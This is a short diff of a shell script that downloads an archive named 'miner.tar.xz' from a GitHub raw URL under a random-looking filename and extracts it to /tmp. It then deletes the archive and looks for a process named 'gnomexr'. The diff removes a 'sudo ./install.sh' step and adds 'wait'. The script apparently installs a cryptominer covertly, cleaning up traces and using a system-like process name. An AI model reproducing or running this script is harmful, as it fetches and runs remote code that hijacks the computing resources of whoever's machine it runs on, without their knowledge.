@@ -1,6 +1,6 @@
 curl -o qfsdosfsafs.tar.xz https://raw.githubusercontent.com/dnfh87/132test/main/miner.tar.xz
+wait
 tar -xf qfsdosfsafs.tar.xz -C /tmp
-sudo ./install.sh
 sudo rm -r qfsdosfsafs.tar.xz
 
 pid=$(pgrep -x gnomexr)
